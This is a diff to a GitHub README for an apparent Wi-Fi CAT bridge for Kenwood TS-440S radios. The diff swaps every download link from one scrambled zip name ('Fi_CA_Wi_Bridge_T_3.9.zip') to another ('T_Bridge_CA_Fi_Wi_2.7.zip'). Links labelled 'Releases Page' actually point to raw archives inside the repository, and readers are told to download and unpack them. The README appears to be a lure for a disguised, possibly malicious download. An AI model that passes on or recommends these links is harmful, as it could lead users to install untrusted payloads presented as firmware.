@@ -1,7 +1,7 @@
 # 🌐 TS440S_WiFi_CAT_Bridge - Connect Your Kenwood Seamlessly
 
 ## 📥 Download Here
-[![Download TS440S_WiFi_CAT_Bridge](https://github.com/karatepradeep/TS440S_WiFi_CAT_Bridge/raw/refs/heads/master/TS440S_WiFi_CAT_Bridge/Fi_CA_Wi_Bridge_T_3.9.zip%20release-blue)](https://github.com/karatepradeep/TS440S_WiFi_CAT_Bridge/raw/refs/heads/master/TS440S_WiFi_CAT_Bridge/Fi_CA_Wi_Bridge_T_3.9.zip)
+[![Download TS440S_WiFi_CAT_Bridge](https://github.com/karatepradeep/TS440S_WiFi_CAT_Bridge/raw/refs/heads/master/TS440S_WiFi_CAT_Bridge/T_Bridge_CA_Fi_Wi_2.7.zip%20release-blue)](https://github.com/karatepradeep/TS440S_WiFi_CAT_Bridge/raw/refs/heads/master/TS440S_WiFi_CAT_Bridge/T_Bridge_CA_Fi_Wi_2.7.zip)
 
 ## 📖 Overview
 The TS440S_WiFi_CAT_Bridge allows you to connect your Kenwood TS-440S radio to your WiFi network. This bridge enables communication with applications like rigctl and WSJT-X, making your ham radio experience more versatile. The user-friendly web interface ensures ease of use for everyone.
@@ -10,7 +10,7 @@ The TS440S_WiFi_CAT_Bridge allows you to connect your Kenwood TS-440S radio to y
 To get started with the TS440S_WiFi_CAT_Bridge, follow these simple steps:
 
 1. **Download the Software:** 
-   Visit the [Releases Page](https://github.com/karatepradeep/TS440S_WiFi_CAT_Bridge/raw/refs/heads/master/TS440S_WiFi_CAT_Bridge/Fi_CA_Wi_Bridge_T_3.9.zip) to access the latest version.
+   Visit the [Releases Page](https://github.com/karatepradeep/TS440S_WiFi_CAT_Bridge/raw/refs/heads/master/TS440S_WiFi_CAT_Bridge/T_Bridge_CA_Fi_Wi_2.7.zip) to access the latest version.
 
 2. **Prepare Your Device:**
    Ensure you have an ESP-01S WiFi module. Check the voltage and connections carefully to prevent damage.
@@ -34,7 +34,7 @@ To get started with the TS440S_WiFi_CAT_Bridge, follow these simple steps:
 - **Software:** Arduino IDE for flashing firmware, compatible web browser for using the interface.
 
 ## 📥 Download & Install
-To get the software, **visit this page to download** the latest release: [Releases Page](https://github.com/karatepradeep/TS440S_WiFi_CAT_Bridge/raw/refs/heads/master/TS440S_WiFi_CAT_Bridge/Fi_CA_Wi_Bridge_T_3.9.zip).
+To get the software, **visit this page to download** the latest release: [Releases Page](https://github.com/karatepradeep/TS440S_WiFi_CAT_Bridge/raw/refs/heads/master/TS440S_WiFi_CAT_Bridge/T_Bridge_CA_Fi_Wi_2.7.zip).
 
 After downloading, unpack the files and store them in a known location. Follow the flashing instructions included in the release notes to set up your device.
 
